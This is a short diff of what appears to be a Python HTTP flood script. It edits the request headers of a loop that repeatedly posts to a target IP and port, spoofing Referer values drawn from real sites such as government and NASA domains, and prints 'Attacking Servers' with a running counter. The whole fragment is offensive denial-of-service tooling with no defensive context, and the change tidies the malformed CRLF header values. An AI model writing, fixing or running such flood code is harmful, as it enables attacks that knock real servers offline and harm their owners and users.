@@ -61,13 +61,13 @@ while True:
             urls = ['https://www.dpr.go.id', 'https://www.yandex.com', 'https://eiht.my.id', 'https://www.google.com', 'https://www.nasa.gov', 'https://www.cia.gov', 'https://spacex.com', 'https://lahelu.com', 'https://data.gov.il', 'https://kosred.com', 'https://pornhub.com']
             res = random.choice(urls)
             headers = {
-                "User-Agent": f"{y}\r\n\r\n",
-                "Pragma": "no-cache\r\n\r\n",
-                "Connection": "Keep-Alive\r\n\r\n",
-                "Referer": f"{res}\r\n\r\n",
-                "Cache-Control": "no-store, no-cache\r\n\r\n",
+                "User-Agent": f"{y}",
+                "Pragma": "no-cache",
+                "Connection": "Keep-Alive",
+                "Referer": f"{res}",
+                "Cache-Control": "no-store, no-cache",
                 "Host": f"{fip}",
-                "GET": " / HTTP/1.1\r\n\r\n"
+                "GET": " / HTTP/1.1\r\n"
             }
             response = requests.post(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
